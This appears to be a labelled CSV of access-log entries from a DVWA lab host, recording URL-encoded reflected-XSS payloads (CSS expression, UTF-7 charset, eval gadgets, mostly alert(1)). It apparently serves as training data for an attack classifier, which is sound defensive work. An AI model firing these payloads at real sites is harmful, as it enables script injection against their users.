ip,identity,user,timestamp,request,status,size,referer,user_agent,vulnerability,method,url,protocol,request_length,url_parts,user_agent_length,Predicted_Vulnerability
12.12.12.11,-,-,2024-07-01 16:26:52-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3d%22%5c%5c%(jscript)s%22%3e%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1715,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3d%22%5c%5c%(jscript)s%22%3e%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,150,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:27:01-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cobject%20id%3d%22x%22%20classid%3d%22clsid%3aCB927D12-4FF7-4a9e-A169-56E4B8A75598%22%3e%3c%2fobject%3e%20%3cobject%20classid%3d%22clsid%3a02BF25D5-8C17-4B23-BC80-D3488ABDDC6B%22%20onqt_error%3d%22javascript%3aalert(1)%22%20style%3d%22behavior%3aurl(%23x)%3b%22%3e%3cparam%20name%3dpostdomevents%20%2f%3e%3c%2fobject%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1861,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cobject%20id%3d%22x%22%20classid%3d%22clsid%3aCB927D12-4FF7-4a9e-A169-56E4B8A75598%22%3e%3c%2fobject%3e%20%3cobject%20classid%3d%22clsid%3a02BF25D5-8C17-4B23-BC80-D3488ABDDC6B%22%20onqt_error%3d%22javascript%3aalert(1)%22%20style%3d%22behavior%3aurl(%23x)%3b%22%3e%3cparam%20name%3dpostdomevents%20%2f%3e%3c%2fobject%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,412,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:27:10-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3ca%20style%3d%22-o-link%3a'javascript%3ajavascript%3aalert(1)'%3b-o-link-source%3acurrent%22%3eX&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1740,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3ca%20style%3d%22-o-link%3a'javascript%3ajavascript%3aalert(1)'%3b-o-link-source%3acurrent%22%3eX&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,189,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:27:19-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cstyle%3ep[foo%3dbar%7b%7d%2a%7b-o-link%3a'javascript%3ajavascript%3aalert(1)'%7d%7b%7d%2a%7b-o-link-source%3acurrent%7d]%7bcolor%3ared%7d%3b%3c%2fstyle%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1768,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cstyle%3ep[foo%3dbar%7b%7d%2a%7b-o-link%3a'javascript%3ajavascript%3aalert(1)'%7d%7b%7d%2a%7b-o-link-source%3acurrent%7d]%7bcolor%3ared%7d%3b%3c%2fstyle%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,248,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:27:28-04:00,"GET /DVWA/vulnerabilities/xss_r/?name=%3clink%20rel%3dstylesheet%20href%3ddata%3a,%2a%7bx%3aexpression(javascript%3aalert(1))%7d&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1",200,1739,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,"/DVWA/vulnerabilities/xss_r/?name=%3clink%20rel%3dstylesheet%20href%3ddata%3a,%2a%7bx%3aexpression(javascript%3aalert(1))%7d&user_token=9f6911951c8b8d903fd5b7a9834a6ae5",HTTP/1.1,181,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:27:36-04:00,"GET /DVWA/vulnerabilities/xss_r/?name=%3cstyle%3e@import%20%22data%3a,%2a%7bx%3aexpression(javascript%3aalert(1))%7D%22%3b%3c%2fstyle%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1",200,1748,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,"/DVWA/vulnerabilities/xss_r/?name=%3cstyle%3e@import%20%22data%3a,%2a%7bx%3aexpression(javascript%3aalert(1))%7D%22%3b%3c%2fstyle%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5",HTTP/1.1,189,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:27:45-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3ca%20style%3d%22pointer-events%3anone%3bposition%3aabsolute%3b%22%3e%3ca%20style%3d%22position%3aabsolute%3b%22%20onclick%3d%22javascript%3aalert(1)%3b%22%3eXXX%3c%2fa%3e%3c%2fa%3e%3ca%20href%3d%22javascript%3ajavascript%3aalert(1)%22%3eXXX%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1769,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3ca%20style%3d%22pointer-events%3anone%3bposition%3aabsolute%3b%22%3e%3ca%20style%3d%22position%3aabsolute%3b%22%20onclick%3d%22javascript%3aalert(1)%3b%22%3eXXX%3c%2fa%3e%3c%2fa%3e%3ca%20href%3d%22javascript%3ajavascript%3aalert(1)%22%3eXXX%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,343,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:27:54-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cstyle%3e%2a[%7b%7d@import'%(css)s%3f]%3c%2fstyle%3eX&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1734,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cstyle%3e%2a[%7b%7d@import'%(css)s%3f]%3c%2fstyle%3eX&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,146,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:28:03-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cdiv%20style%3d%22font-family%3a'foo%26%2310%3b%3bcolor%3ared%3b'%3b%22%3eXXX&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1742,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cdiv%20style%3d%22font-family%3a'foo%26%2310%3b%3bcolor%3ared%3b'%3b%22%3eXXX&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,170,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:28:12-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cdiv%20style%3d%22font-family%3afoo%7dcolor%3dred%3b%22%3eXXX&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1735,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cdiv%20style%3d%22font-family%3afoo%7dcolor%3dred%3b%22%3eXXX&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,154,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:28:21-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3c%2f%2f%20style%3dx%3aexpression%5c28javascript%3aalert(1)%5c29%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1731,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3c%2f%2f%20style%3dx%3aexpression%5c28javascript%3aalert(1)%5c29%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,159,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:28:30-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cstyle%3e%2a%7bx%3a\xef\xbd\x85\xef\xbd\x98\xef\xbd\x90\xef\xbd\x92\xef\xbd\x85\xef\xbd\x93\xef\xbd\x93\xef\xbd\x89\xef\xbd\x8f\xef\xbd\x8e(javascript%3aalert(1))%7d%3c%2fstyle%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1768,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cstyle%3e%2a%7bx%3a\xef\xbd\x85\xef\xbd\x98\xef\xbd\x90\xef\xbd\x92\xef\xbd\x85\xef\xbd\x93\xef\xbd\x93\xef\xbd\x89\xef\xbd\x8f\xef\xbd\x8e(javascript%3aalert(1))%7d%3c%2fstyle%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,272,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:28:39-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cdiv%20style%3dcontent%3aurl(%(svg)s)%3e%3c%2fdiv%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1724,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cdiv%20style%3dcontent%3aurl(%(svg)s)%3e%3c%2fdiv%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,145,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:28:48-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cdiv%20style%3d%22list-style%3aurl(http%3a%2f%2ffoo%2ef)%5c20url(javascript%3ajavascript%3aalert(1))%3b%22%3eX&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1745,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cdiv%20style%3d%22list-style%3aurl(http%3a%2f%2ffoo%2ef)%5c20url(javascript%3ajavascript%3aalert(1))%3b%22%3eX&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,203,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:28:58-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cdiv%20id%3dd%3e%3cdiv%20style%3d%22font-family%3a'sans%5c27%5c3B%20color%5c3Ared%5c3B'%22%3eX%3c%2fdiv%3e%3c%2fdiv%3e%20%3cscript%3ewith(document%2egetElementById(%22d%22))innerHTML%3dinnerHTML%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1793,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cdiv%20id%3dd%3e%3cdiv%20style%3d%22font-family%3a'sans%5c27%5c3B%20color%5c3Ared%5c3B'%22%3eX%3c%2fdiv%3e%3c%2fdiv%3e%20%3cscript%3ewith(document%2egetElementById(%22d%22))innerHTML%3dinnerHTML%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,302,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:29:07-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cdiv%20style%3d%22background%3aurl(%2ff%23%26%23127%3boo%2f%3bcolor%3ared%2f%2a%2ffoo%2ejpg)%3b%22%3eX&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1749,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cdiv%20style%3d%22background%3aurl(%2ff%23%26%23127%3boo%2f%3bcolor%3ared%2f%2a%2ffoo%2ejpg)%3b%22%3eX&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,195,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:29:16-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cdiv%20style%3d%22font-family%3afoo%7bbar%3bbackground%3aurl(http%3a%2f%2ffoo%2ef%2foo%7d%3bcolor%3ared%2f%2a%2ffoo%2ejpg)%3b%22%3eX&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1766,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cdiv%20style%3d%22font-family%3afoo%7bbar%3bbackground%3aurl(http%3a%2f%2ffoo%2ef%2foo%7d%3bcolor%3ared%2f%2a%2ffoo%2ejpg)%3b%22%3eX&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,225,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:29:25-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cdiv%20id%3d%22x%22%3eXXX%3c%2fdiv%3e%20%3cstyle%3e%20%20%23x%7bfont-family%3afoo[bar%3bcolor%3agreen%3b%7d%20%20%23y]%3bcolor%3ared%3b%7b%7d%20%20%3c%2fstyle%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1766,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cdiv%20id%3d%22x%22%3eXXX%3c%2fdiv%3e%20%3cstyle%3e%20%20%23x%7bfont-family%3afoo[bar%3bcolor%3agreen%3b%7d%20%20%23y]%3bcolor%3ared%3b%7b%7d%20%20%3c%2fstyle%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,254,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:29:34-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20style%3d%22background%3aurl('x%26%231%3b%3bcolor%3ared%3b%2f%2a')%22%3eXXX%3c%2fx%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1744,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20style%3d%22background%3aurl('x%26%231%3b%3bcolor%3ared%3b%2f%2a')%22%3eXXX%3c%2fx%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,182,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:29:43-04:00,"GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%3e(%7bset%2f%2a%2a%2f$($)%7b_%2f%2a%2a%2fsetter%3d$,_%3djavascript%3aalert(1)%7d%7d)%2e$%3deval%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1",200,1751,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,"/DVWA/vulnerabilities/xss_r/?name=%3cscript%3e(%7bset%2f%2a%2a%2f$($)%7b_%2f%2a%2a%2fsetter%3d$,_%3djavascript%3aalert(1)%7d%7d)%2e$%3deval%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5",HTTP/1.1,211,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:29:52-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%3e(%7b0%3a%230%3deval%2f%230%23%2f%230%23(javascript%3aalert(1))%7d)%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1738,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%3e(%7b0%3a%230%3deval%2f%230%23%2f%230%23(javascript%3aalert(1))%7d)%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,184,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:30:01-04:00,"GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%3eReferenceError%2eprototype%2e__defineGetter__('name',%20function()%7bjavascript%3aalert(1)%7d),x%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1",200,1766,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,"/DVWA/vulnerabilities/xss_r/?name=%3cscript%3eReferenceError%2eprototype%2e__defineGetter__('name',%20function()%7bjavascript%3aalert(1)%7d),x%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5",HTTP/1.1,214,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:30:11-04:00,"GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%3eObject%2e__noSuchMethod__%20%3d%20Function,[%7b%7d][0]%2econstructor%2e_('javascript%3aalert(1)')()%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1",200,1767,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,"/DVWA/vulnerabilities/xss_r/?name=%3cscript%3eObject%2e__noSuchMethod__%20%3d%20Function,[%7b%7d][0]%2econstructor%2e_('javascript%3aalert(1)')()%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5",HTTP/1.1,217,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:30:20-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cmeta%20charset%3d%22x-imap4-modified-utf7%22%3e%26ADz%26AGn%26AG0%26AEf%26ACA%26AHM%26AHI%26AGO%26AD0%26AGn%26ACA%26AG8Abg%26AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ%26ACAAPABi&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1802,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cmeta%20charset%3d%22x-imap4-modified-utf7%22%3e%26ADz%26AGn%26AG0%26AEf%26ACA%26AHM%26AHI%26AGO%26AD0%26AGn%26ACA%26AG8Abg%26AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ%26ACAAPABi&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,268,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:30:29-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cmeta%20charset%3d%22x-imap4-modified-utf7%22%3e%26%3cscript%26S1%26TS%261%3ealert%26A7%26(1)%26R%26UA%3b%26%26%3c%26A9%2611%2fscript%26X%26%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1768,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cmeta%20charset%3d%22x-imap4-modified-utf7%22%3e%26%3cscript%26S1%26TS%261%3ealert%26A7%26(1)%26R%26UA%3b%26%26%3c%26A9%2611%2fscript%26X%26%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,236,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:30:38-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cmeta%20charset%3d%22mac-farsi%22%3e\xc2\xbcscript\xc2\xbejavascript%3aalert(1)\xc2\xbc%2fscript\xc2\xbe&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1739,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cmeta%20charset%3d%22mac-farsi%22%3e\xc2\xbcscript\xc2\xbejavascript%3aalert(1)\xc2\xbc%2fscript\xc2\xbe&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,197,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:30:48-04:00,GET /DVWA/vulnerabilities/xss_r/?name=X%3cx%20style%3d%60behavior%3aurl(%23default%23time2)%60%20onbegin%3d%60javascript%3aalert(1)%60%20%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1750,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=X%3cx%20style%3d%60behavior%3aurl(%23default%23time2)%60%20onbegin%3d%60javascript%3aalert(1)%60%20%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,193,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:30:57-04:00,GET /DVWA/vulnerabilities/xss_r/?name=1%3cset%2fxmlns%3d%60urn%3aschemas-microsoft-com%3atime%60%20style%3d%60beh%26%23x41vior%3aurl(%23default%23time2)%60%20attributename%3d%60innerhtml%60%20to%3d%60%26lt%3bimg%2fsrc%3d%26quot%3bx%26quot%3bonerror%3djavascript%3aalert(1)%26gt%3b%60%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1822,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=1%3cset%2fxmlns%3d%60urn%3aschemas-microsoft-com%3atime%60%20style%3d%60beh%26%23x41vior%3aurl(%23default%23time2)%60%20attributename%3d%60innerhtml%60%20to%3d%60%26lt%3bimg%2fsrc%3d%26quot%3bx%26quot%3bonerror%3djavascript%3aalert(1)%26gt%3b%60%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,339,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:31:06-04:00,GET /DVWA/vulnerabilities/xss_r/?name=1%3canimate%2fxmlns%3durn%3aschemas-microsoft-com%3atime%20style%3dbehavior%3aurl(%23default%23time2)%20attributename%3dinnerhtml%20values%3d%26lt%3bimg%2fsrc%3d%26quot%3b%2e%26quot%3bonerror%3djavascript%3aalert(1)%26gt%3b%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1811,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=1%3canimate%2fxmlns%3durn%3aschemas-microsoft-com%3atime%20style%3dbehavior%3aurl(%23default%23time2)%20attributename%3dinnerhtml%20values%3d%26lt%3bimg%2fsrc%3d%26quot%3b%2e%26quot%3bonerror%3djavascript%3aalert(1)%26gt%3b%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,317,5,116,XSS
